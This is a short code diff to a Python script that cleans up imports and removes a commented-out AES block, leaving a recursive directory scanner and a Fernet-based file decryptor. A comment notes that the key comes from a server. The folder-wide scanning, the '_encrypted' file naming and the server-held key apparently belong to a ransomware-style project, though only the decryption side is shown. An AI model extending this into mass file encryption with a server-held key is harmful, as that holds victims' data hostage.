@@ -1,12 +1,6 @@
 import os
 from pathlib import Path
-from Crypto.Cipher import AES
-# temporary
 from cryptography.fernet import Fernet
-
-import json
-from base64 import b64encode
-from Crypto.Random import get_random_bytes
 
 def recursiveScan(baseDir):
     # scan current directory
@@ -43,7 +37,6 @@ def decrypt(file, key):
     
     decrypted = f.decrypt(encrypted)
 
-
     filename, extension = str(file).split('.')
     filename = filename.split('_encrypted')[0]
 
@@ -52,22 +45,6 @@ def decrypt(file, key):
 
     with open(decFile, 'wb+') as fl:
         fl.write(decrypted)
-
-    '''
-    extension = file.suffix.lower()
-    with open(file, 'rb') as f:
-        data = bytes(f.read())
-
-    try:
-        b64 = json.loads(json_input)
-        nonce = b64decode(b64['nonce'])
-        ct = b64decode(b64['ciphertext'])
-        cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
-        pt = cipher.decrypt(ct)
-        print("The message was: ", pt)
-    except (ValueError, KeyError):
-        print("Incorrect decryption")
-    '''
 
 
 # key is given by server
